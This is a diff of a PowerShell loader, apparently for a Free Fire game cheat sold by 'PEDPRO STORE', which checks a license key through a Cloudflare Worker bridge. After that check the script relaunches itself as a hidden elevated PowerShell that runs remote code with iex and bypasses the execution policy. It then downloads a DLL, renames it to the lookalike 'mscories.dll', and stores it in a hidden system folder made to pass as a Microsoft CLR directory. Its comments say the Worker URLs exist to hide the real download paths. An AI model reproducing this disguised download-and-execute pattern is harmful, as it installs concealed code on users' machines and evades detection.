@@ -1,16 +1,16 @@
 # ============================================================
-# dugduy.ps1 - PEDPRO STORE (ORIGINAL STABLE)
+# dugduy.ps1 - PEDPRO STORE (FULL VERSION)
 # ============================================================
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
 netsh winhttp reset proxy | Out-Null
 $ProgressPreference = 'SilentlyContinue'
 
-# ต่อตรงกับ KeyAuth ดั้งเดิมของพี่ ไม่ผ่าน Worker
+# ข้อมูล API จาก KeyAuth ผ่านสะพาน Cloudflare Worker ตัวหลัก (ถ้ามี)
 $OwnerID   = "vGgzXjkfQj" 
 $AppName   = "GetX"
 $Version   = "1.0"
-$KeyAuthUrl = "https://keyauth.win" 
+$BridgeUrl = "https://getx.getx796.workers.dev"
 
 Clear-Host
 Write-Host "========================================" -ForegroundColor Cyan
@@ -22,13 +22,14 @@ $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
 $userKey = Read-Host "[?] Please enter your License Key"
 Write-Host "[*] Checking license for HWID: $hwid" -ForegroundColor Gray
 
-$authUrl = "$KeyAuthUrl/api/1.3/?type=init&name=$AppName&ownerid=$OwnerID&ver=$Version"
+$authUrl = "$BridgeUrl/api/1.3/?type=init&name=$AppName&ownerid=$OwnerID&ver=$Version"
 
 try {
     $initReq = Invoke-RestMethod -Uri $authUrl -Method Get -TimeoutSec 15 -UserAgent "Mozilla/5.0"
+    
     if ($initReq.success -eq "true") {
         $sessionid = $initReq.sessionid
-        $loginUrl = "$KeyAuthUrl/api/1.3/?type=license&key=$userKey&sessionid=$sessionid&name=$AppName&ownerid=$OwnerID&hwid=$hwid"
+        $loginUrl = "$BridgeUrl/api/1.3/?type=license&key=$userKey&sessionid=$sessionid&name=$AppName&ownerid=$OwnerID&hwid=$hwid"
         $loginReq = Invoke-RestMethod -Uri $loginUrl -Method Get -UserAgent "Mozilla/5.0"
 
         if ($loginReq.success -ne "true") {
@@ -43,17 +44,18 @@ try {
     }
 } catch {
     Write-Host "[-] CONNECTION FAILED" -ForegroundColor Red
-    $null = [Console的美]刻Key(); exit
+    $null = [Console]::ReadKey(); exit
 }
 
+# ส่วนบังคับสิทธิ์แอดมิน ให้ดึงจากลิงก์หน้ากาก Worker แทนเพื่อไม่ให้หลุดพรางตา
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "[*] Requesting Admin..." -ForegroundColor Yellow
-    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://raw.githubusercontent.com/getx796-Harem/cmdFreefire/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
+    Write-Host "[*] Escalating to Admin..." -ForegroundColor Yellow
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://naheeeeeeee.getx796.workers.dev' -UseBasicParsing).Content)`"" -Verb RunAs
     exit
 }
 
-# 🛑 จุดสำคัญ: ชี้ลิงก์ดาวน์โหลด DLL มาที่ Worker เพื่อซ่อนพาธ GitHub จริง
-$url = "https://naheeeeeeee.getx796.workers.dev/"
+# ลิงก์ดาวน์โหลด DLL ตัวใหม่ล่าสุดตามที่คุณแจ้งไว้
+$url = "https://github.com/getx796-Harem/cmdFreefire/releases/download/v1.0/dllfreefire.dll"
 $fakeName = "mscories.dll"
 $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
 $dllPath = Join-Path $workDir $fakeName
@@ -65,10 +67,9 @@ attrib +h +s $workDir
 
 Write-Host "[*] Downloading components..." -ForegroundColor Gray
 try {
-    # ส่งคำขอไปที่ Worker โดยใช้ User-Agent ของ PowerShell เพื่อดึงไฟล์ DLL ตัวจริงออกมารัน
-    Invoke-WebRequest -Uri $url -OutFile $dllPath -UserAgent "WindowsPowerShell"
+    Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing
 } catch {
-    Write-Host "[-] DOWNLOAD ERROR: ไม่สามารถดาวน์โหลดโมดูลความปลอดภัยได้" -ForegroundColor Red
+    Write-Host "[-] DOWNLOAD ERROR" -ForegroundColor Red
     Pause; exit
 }
 
